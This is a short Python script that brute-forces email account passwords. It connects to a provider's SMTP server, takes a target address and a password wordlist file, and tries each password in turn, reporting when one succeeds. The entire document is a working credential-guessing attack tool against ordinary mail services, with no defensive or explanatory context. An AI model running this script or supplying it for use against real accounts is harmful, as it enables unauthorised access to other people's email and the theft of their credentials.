import smtplib
smtpserver = smtplib.SMTP("smtp."+input("Enter mail provider (gmail, mail.yahoo): ")+".com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = input("Enter Address: ")
passwfile = input("Enter Password Filename: ")
passwfile = open(passwfile, "r")
for password in passwfile:
    try:
        smtpserver.login(user, password)
        print("[+]Password Tried; Password Found: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[-]Password Tried; Incorrect: %s" % password)